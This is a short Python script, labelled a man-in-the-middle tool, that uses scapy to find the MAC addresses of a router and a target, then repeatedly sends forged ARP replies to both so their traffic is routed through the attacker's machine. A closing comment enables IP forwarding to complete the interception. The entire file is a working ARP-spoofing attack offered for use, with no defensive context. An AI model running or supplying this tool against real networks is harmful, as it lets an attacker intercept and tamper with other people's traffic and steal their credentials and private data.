# -*- Coding : utf-8 -*-

"""
    Man in the middle tool.
"""

import scapy.all as scapy
import sys, time

def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet= broadcast_layer/arp_layer

    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
    router_packet = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    target_packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(router_packet)
    scapy.send(target_packet)

router_ip = str(sys.argv[1])
target_ip = str(sys.argv[2])
router_mac = get_mac_address(router_ip)
target_mac = get_mac_address(target_ip)

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[x] Closing ARP spoofer")
    sys.exit(0)

# echo 1 > /proc/sys/net/ipv4/ip_forward